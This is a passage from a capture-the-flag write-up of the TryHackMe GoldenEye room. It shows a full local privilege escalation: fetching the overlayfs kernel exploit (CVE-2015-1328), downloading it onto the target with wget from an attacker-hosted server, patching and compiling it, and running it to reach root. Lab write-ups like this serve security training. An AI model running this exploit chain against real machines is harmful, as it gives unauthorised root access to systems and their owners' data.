- Execute the modified su binary

You can download the exploit from here: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ searchsploit -m 37292                            
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /mnt/hgfs/Wargames/TryHackMe/Challenges/Medium/GoldenEye/37292.c
```

Download and compile it at the target machine

```bash
www-data@ubuntu:/tmp$ wget http://192.168.144.77:8000/37292.c
wget http://192.168.144.77:8000/37292.c
--2026-02-08 07:56:09--  http://192.168.144.77:8000/37292.c
Connecting to 192.168.144.77:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: '37292.c'

100%[======================================>] 4,968       --.-K/s   in 0.002s  

2026-02-08 07:56:09 (3.09 MB/s) - '37292.c' saved [4968/4968]

www-data@ubuntu:/tmp$ gcc 37292.c -o ofs
gcc 37292.c -o ofs
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
www-data@ubuntu:/tmp$ 
```

#### Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key

Nope, that didn't work. And the exploit expects `gcc` to be installed!

```bash
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
www-data@ubuntu:/tmp$ 
```

But looking back at the enumeration output we also have `cc`

```text
[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...

[+] Installed Tools
    /usr/bin/awk
    /usr/bin/perl
    /usr/bin/python
    /usr/bin/cc
    /usr/bin/vi
    /usr/bin/vim
    /usr/bin/find
    /bin/netcat
    /bin/nc
    /usr/bin/wget
    /usr/bin/ftp
```

So we change `gcc` to `cc` in the exploit with `sed` and try to compile it with `cc` instead

```bash
www-data@ubuntu:/tmp$ sed -i "s/gcc/cc/g" 37292.c
sed -i "s/gcc/cc/g" 37292.c
www-data@ubuntu:/tmp$ grep system 37292.c
grep system 37292.c
    system("rm -rf /tmp/ns_sploit");
    lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
www-data@ubuntu:/tmp$ cc 37292.c -o ofs
cc 37292.c -o ofs
37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
www-data@ubuntu:/tmp$ ls -l
ls -l
total 56
-rw-rw-rw- 1 www-data www-data  4966 Feb  8 08:04 37292.c
-rw-rw-rw- 1 www-data www-data 25304 Feb  8 07:46 linuxprivchecker.py
-rwxrwxrwx 1 www-data www-data 13773 Feb  8 08:05 ofs
-rw------- 1 www-data www-data     8 Feb  8 07:37 tinyspell47Es4p
www-data@ubuntu:/tmp$ 
```

Some warnings, but we managed to compile the exploit.

### What is the root flag?

Finally, we can run the exploit and get the flag

```bash
www-data@ubuntu:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/tmp$ ./ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
cd /root
# ls -la
ls -la
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
# cat .flag.txt
cat .flag.txt
Alec told me to place the codes here: 

5<REDACTED>3

If you captured this make sure to go here.....
/006-final/xvf7-flag/

# 
```

Answer: `5<REDACTED>3`

![GoldenEye Training Flag Page](Images/GoldenEye_Training_Flag_Page.png)

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [Binary Refinery - Documentation](https://binref.github.io/)
- [Binary Refinery - GitHub](https://github.com/binref/refinery/)
- [cc - Manual page](https://www.unix.com/man_page/v7/1/cc/)
- [Dovecot (software) - Wikipedia](https://en.wikipedia.org/wiki/Dovecot_(software))
- [echo - Linux manual page](https://man7.org/linux/man-pages/man1/echo.1.html)
- [exiftool - Linux manual page](https://linux.die.net/man/1/exiftool)
- [ExifTool - Wikipedia](https://en.wikipedia.org/wiki/ExifTool)
- [file - Linux manual page](https://man7.org/linux/man-pages/man1/file.1.html)
- [gcc - Linux manual page](https://man7.org/linux/man-pages/man1/gcc.1.html)
- [Hydra - GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra - Kali Tools](https://www.kali.org/tools/hydra/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Post Office Protocol - Wikipedia](https://en.wikipedia.org/wiki/Post_Office_Protocol)
- [Postfix (software) - Wikipedia](https://en.wikipedia.org/wiki/Postfix_(software))
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [Reverse Shell Generator - Homepage](https://www.revshells.com/)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [sed - Linux manual page](https://man7.org/linux/man-pages/man1/sed.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [tail - Linux manual page](https://man7.org/linux/man-pages/man1/tail.1.html)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
